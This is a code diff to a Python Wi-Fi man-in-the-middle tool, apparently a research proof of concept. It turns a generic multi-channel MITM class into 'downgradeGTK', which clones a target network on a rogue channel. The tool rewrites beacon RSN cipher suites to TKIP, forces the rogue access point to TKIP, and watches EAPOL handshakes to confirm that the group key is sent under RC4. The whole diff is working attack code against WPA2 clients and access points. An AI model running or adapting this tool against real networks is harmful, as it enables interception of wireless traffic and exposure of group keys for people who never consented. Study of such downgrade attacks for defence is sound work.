@@ -125,6 +125,14 @@ def get_eapol_replaynum(p):
 	"""
 	return struct.unpack(">Q", raw(p[EAPOL])[9:17])[0]
 
+def get_eapol_cipher(p):
+    FLAG_CIPHER_CCMP = 0b000000010
+    if not EAPOL in p: return 0
+    keyinfo = raw(p[EAPOL])[5:7]
+    flags = struct.unpack(">H", keyinfo)[0]
+    if flags & FLAG_CIPHER_CCMP:
+        return 4
+    return 2
 
 def construct_csa(channel, count=1):
 	"""Construct a Channel Switch Announcement (CSA) Information Element (IE)"""
@@ -303,7 +311,7 @@ wpa_passphrase=XXXXXXXX"""
 			channel = self.rogue_channel,
 			wpaver = self.wpavers,
 			akms = " ".join([akm2str[idx] for idx in self.akms]),
-			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
+			pairwise = "TKIP",
 			#TODO: Also replicate management frame support
 			ptksa_counters = (self.capab & 0b001100) >> 2,
 			gtksa_counters = (self.capab & 0b110000) >> 4,
@@ -323,16 +331,16 @@ class ClientState():
 	# - GotMitm: the client has switched to the rogue channel. The MC-MITM is working!
 	# - Attack_Started: not used by default. In some cases we want to wait until a certain conditions
 	#                   before starting attacks (e.g. waiting after the handshake is completed).
-	# - Attack_Done: not used by default. Can be set after completing an attack, in which
-	#                less debug output about this client will be printed.
-	Initializing, Connecting, GotMitm, Attack_Started, Attack_Done = range(5)
+	# - Success_RC4GTK: Message 3 of the Handshake received with the Cipher TKIP, the transmitted Group Key is encrypted with RC4
+	# - Failed: The exchanged Handshake Messages still use CCMP as the Cipher
+	Initializing, Connecting, GotMitm, Attack_Started, Success_RC4GTK, Failed = range(6)
 
 	def state2str(self, state):
-		strings = ["Initializing", "Connecting", "GotMitm", "Attack_Started", "Attack_Done"]
+		strings = ["Initializing", "Connecting", "GotMitm", "Attack_Started", "Success_Rc4GTK", "Failed"]
 		assert 0 <= state < len(strings)
 		return strings[state]
-
-
+	
+	
 	def __init__(self, macaddr):
 		self.macaddr = macaddr
 		self.reset()
@@ -377,8 +385,15 @@ class ClientState():
 		# By default, everything is forwarded.
 		return True
 
+	def modify_beacon_cipher(self, p, ssid, chosen_cipher):
+		if get_ssid(p) == ssid:
+			if not Dot11Elt in p: return None
+			p[Dot11EltRSN].group_cipher_suite = RSNCipherSuite(cipher=chosen_cipher)
+			p[Dot11EltRSN].pairwise_cipher_suites = [RSNCipherSuite(cipher=chosen_cipher)]
+			return p
+		return None
 
-	def modify_packet(self, p):
+	def modify_packet(self, p, ssid):
 		"""
 		Here you can modify packets that are sent between the client and AP. You can infer the
 		direction from the frame based on the reciever MAC address.
@@ -387,7 +402,10 @@ class ClientState():
 		selected frames towards the client
 		"""
 
-		# By default, frames are not modified.
+		#2 == TKIP, 4==CCMP
+		modified = self.modify_beacon_cipher(p, ssid, 2)
+		if modified is not None:
+			return modified
 		return p
 
 
@@ -395,7 +413,7 @@ class ClientState():
 		self.update_state(ClientState.Attack_Started)
 
 
-class McMitm():
+class downgradeGTK():
 	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None,
 			cont_csa=False, low_output=False, strict_echo_test=False):
 		self.nic_real = nic_real
@@ -452,6 +470,23 @@ class McMitm():
 		if macaddr in self.clients:
 			del self.clients[macaddr]
 
+	def find_beacon(self, ssid):
+		# FIXME: Use the find_network function of libwifi.
+		self.sock_real.recv()
+		ps = sniff(count=1, timeout=0.3, lfilter=lambda p: get_ssid(p) == ssid, opened_socket=self.sock_real)
+		if ps is None or len(ps) < 1:
+			log(STATUS, "Searching for target network on other channels")
+			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
+				self.sock_real.set_channel(chan)
+				log(DEBUG, "Listening on channel %d" % chan)
+				ps = sniff(count=1, timeout=0.3, lfilter=lambda p: get_ssid(p) == ssid, opened_socket=self.sock_real)
+				if ps and len(ps) >= 1: break
+
+		if ps and len(ps) >= 1:
+			actual_chan = orb(get_element(ps[0], IEEE_TLV_TYPE_CHANNEL).info)
+			self.sock_real.set_channel(actual_chan)
+			self.beacon = ps[0]
+			self.apmac = self.beacon.addr2
 
 	def send_csa_beacon(self, numpairs=1, target=None, silent=False):
 		"""
@@ -568,7 +603,7 @@ class McMitm():
 			# Detect if a client is going into sleep mode and print a warning. Inject a Null frame so that the AP
 			# will think the client is awake though (this likely won't help much - but it's better than nothing).
 			# A similar check is done when processing packets in the rogue channel.
-			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state < ClientState.Attack_Done:
+			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state < ClientState.Success_RC4GTK:
 				log(WARNING, "Client %s is going to sleep while being in the real channel. Injecting Null frame." % p.addr2)
 				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac))
 
@@ -607,8 +642,19 @@ class McMitm():
 				assert p.addr1 in self.clients
 				client = self.clients[p.addr1]
 
+				eapolnum = get_eapol_msgnum(p)
+				eapol_cipher = get_eapol_cipher(p) 
+				if eapol_cipher == 2:
+					if eapolnum == 3:
+						log(STATUS, "SUCCESS! TKIP is being selected as the cipher.", color="green", showtime=False)
+						client.update_state(ClientState.Success_RC4GTK)
+					else:
+						log(STATUS, "TKIP is being selected as the cipher. Waiting for Transmission of the GTK.", color="green", showtime=False)
+				elif eapol_cipher == 4:
+					log(WARNING, "Downgrade Attack against %s seems to have failed" % client.macaddr)
+					client.update_state(ClientState.Failed)
 				# See if we should modify the packet and then inject it.
-				modified = client.modify_packet(p)
+				modified = client.modify_packet(p, self.ssid)
 				self.sock_rogue.send(modified)
 
 			# After forwarding we can delete client state when needed.
@@ -680,10 +726,16 @@ class McMitm():
 
 			# If this now belongs to a client we want to track, process the packet further
 			if client is not None and will_forward:
+				eapol_cipher = get_eapol_cipher(p)
+				if eapol_cipher == 2:
+					log(STATUS, "TKIP is being selected as the cipher. Waiting for Transmission of the GTK.", color="green", showtime=False)
+				elif eapol_cipher == 4:
+					log(WARNING, "Downgrade Attack against %s seems to have failed" % client.macaddr)
+					client.update_state(ClientState.Failed)
 				# Detect if a client is going into sleep mode and print a warning. Remove the sleep flag
 				# before forwarding (this likely won't help much - but it's better than nothing). A similar
 				# check is done when processing packets in the real channel.
-				if p.FCfield & 0x10 != 0 and self.clients[p.addr2].state < ClientState.Attack_Done:
+				if p.FCfield & 0x10 != 0 and self.clients[p.addr2].state < ClientState.Success_RC4GTK:
 					log(WARNING, "Client %s is going to sleep while being in the rogue channel. Removing sleep bit." % p.addr2)
 					p.FCfield &= 0xFFEF
 
@@ -776,7 +828,7 @@ class McMitm():
 			log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
 			return
 		self.apmac = self.beacon.addr2
-
+		
 		# Parse beacon and used this to generate a cloned hostapd_rogue.conf
 		self.netconfig = NetworkConfig()
 		self.netconfig.from_beacon(self.beacon)
@@ -889,7 +941,7 @@ if __name__ == "__main__":
 
 	change_log_level(-args.debug)
 
-	attack = McMitm(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid,
+	attack = downgradeGTK(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid,
 			args.target, args.dump, args.continuous_csa, args.reduce_output, args.strict_echo_test)
 	atexit.register(cleanup)
 	attack.run()
